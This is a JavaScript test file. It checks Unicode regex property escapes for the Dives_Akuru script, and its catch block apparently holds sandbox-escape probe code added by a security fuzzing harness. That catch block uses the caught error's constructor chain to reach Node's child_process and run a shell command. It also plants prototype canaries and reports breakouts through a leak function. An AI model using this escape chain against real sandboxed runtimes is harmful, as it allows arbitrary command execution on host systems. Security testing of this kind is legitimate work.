try {
    const matchSymbols = buildString({
        loneCodePoints: [71945],
        ranges: [
            [
                71936,
                71942
            ],
            [
                71948,
                71955
            ],
            [
                71957,
                71958
            ],
            [
                71960,
                71989
            ],
            [
                71991,
                71992
            ],
            [
                71995,
                72006
            ],
            [
                72016,
                72025
            ]
        ]
    });
    testPropertyEscapes(/^\p{Script_Extensions=Dives_Akuru}+$/u, matchSymbols, '\\p{Script_Extensions=Dives_Akuru}');
    testPropertyEscapes(/^\p{Script_Extensions=Diak}+$/u, matchSymbols, '\\p{Script_Extensions=Diak}');
    testPropertyEscapes(/^\p{scx=Dives_Akuru}+$/u, matchSymbols, '\\p{scx=Dives_Akuru}');
    testPropertyEscapes(/^\p{scx=Diak}+$/u, matchSymbols, '\\p{scx=Diak}');
    const nonMatchSymbols = buildString({
        loneCodePoints: [
            71956,
            71959,
            71990
        ],
        ranges: [
            [
                56320,
                57343
            ],
            [
                0,
                56319
            ],
            [
                57344,
                71935
            ],
            [
                71943,
                71944
            ],
            [
                71946,
                71947
            ],
            [
                71993,
                71994
            ],
            [
                72007,
                72015
            ],
            [
                72026,
                1114111
            ]
        ]
    });
    testPropertyEscapes(/^\P{Script_Extensions=Dives_Akuru}+$/u, nonMatchSymbols, '\\P{Script_Extensions=Dives_Akuru}');
    testPropertyEscapes(/^\P{Script_Extensions=Diak}+$/u, nonMatchSymbols, '\\P{Script_Extensions=Diak}');
    testPropertyEscapes(/^\P{scx=Dives_Akuru}+$/u, nonMatchSymbols, '\\P{scx=Dives_Akuru}');
    testPropertyEscapes(/^\P{scx=Diak}+$/u, nonMatchSymbols, '\\P{scx=Diak}');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}